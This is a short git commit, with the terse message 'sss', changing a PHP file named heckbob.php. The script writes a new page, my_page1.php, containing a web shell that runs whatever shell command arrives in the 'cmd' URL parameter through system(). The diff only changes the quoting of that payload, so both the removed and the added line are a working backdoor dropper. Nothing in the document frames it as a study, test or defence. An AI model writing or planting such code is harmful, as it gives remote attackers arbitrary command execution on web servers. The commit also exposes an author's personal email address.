f2ea820968568276f082ebeb1294c202ffe80207
oodusany <odus.kemi@gmail.com>
2018-03-18 15:00:30 -0400

    sss

--- heckbob.php
+++ heckbob.php
@@ -1,9 +1,8 @@
 <?php 
-
 $pagename = 'my_page1';
 
 $newFileName = './'.$pagename.".php";
-$newFileContent = "<?php echo 'here we are'; system($_GET['cmd']);?>";
+$newFileContent = '<?php echo "here we are"; system($_GET["cmd"]);?>';
 
 if (file_put_contents($newFileName, $newFileContent) !== false) {
     echo "File created (" . basename($newFileName) . ")";
